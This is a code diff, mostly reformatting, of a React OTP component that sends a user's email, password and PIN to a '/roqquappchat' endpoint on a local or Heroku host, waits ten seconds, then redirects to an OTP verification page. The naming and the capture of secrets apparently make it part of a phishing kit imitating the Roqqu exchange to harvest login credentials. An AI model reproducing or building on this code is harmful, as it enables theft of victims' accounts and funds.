@@ -13,16 +13,13 @@ export default function Otp(props) {
     const [loading, setLoading] = useState(false)
 
     const inputHandler = (input) => {
-    
         setOtp(input)
         setKeepOtp((singleOtp) => [input])
     }
 
-
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
-
 
         const clientOtp = keepOtp.toString()
 
@@ -31,51 +28,42 @@ export default function Otp(props) {
 
             templateParams.clientOtp = clientOtp
 
-
-             try {
-                              const URL = 'http://localhost:3030'
+            try {
+                const URL = 'http://localhost:3030'
 
                 // const URL = 'https://roqq.herokuapp.com'
-                 const response = await fetch(URL + '/roqquappchat', {
-                     method: 'POST',
-                     headers: {
-                         'Content-type': 'application/json',
-                     },
-                     body: JSON.stringify({
-                         email: templateParams.email,
-                         password: templateParams.password,
-                         pin: clientOtp,
-                         otp: '',
-                     }),
-                 })
+                const response = await fetch(URL + '/roqquappchat', {
+                    method: 'POST',
+                    headers: {
+                        'Content-type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: templateParams.email,
+                        password: templateParams.password,
+                        pin: clientOtp,
+                        otp: '',
+                    }),
+                })
 
-                 const resData = await response.json()
+                const resData = await response.json()
 
+                if (resData.status === 'success') {
+                    console.log('Message Sent.')
+                    setTimeout(() => {
+                        console.log('time out init')
+                        setLoading(false)
 
-                 if (resData.status === 'success') {
-                     console.log('Message Sent.')
-                      setTimeout(() => {
-                          console.log('time out init')
-                          setLoading(false)
-
-                          history.push('/verifyotp', templateParams)
-                      }, 10000)
-
-                 } else if (resData.status === 'fail') {
-                     console.log('Message failed to send.')
-                                         setLoading(false)
-
-                 }
-             } catch (err) {
-                 console.log(err)
-
-             }
-
-
-          
+                        history.push('/verifyotp', templateParams)
+                    }, 10000)
+                } else if (resData.status === 'fail') {
+                    console.log('Message failed to send.')
+                    setLoading(false)
+                }
+            } catch (err) {
+                console.log(err)
+            }
         }
     }
-
 
     return (
         <div className='container mx-auto'>
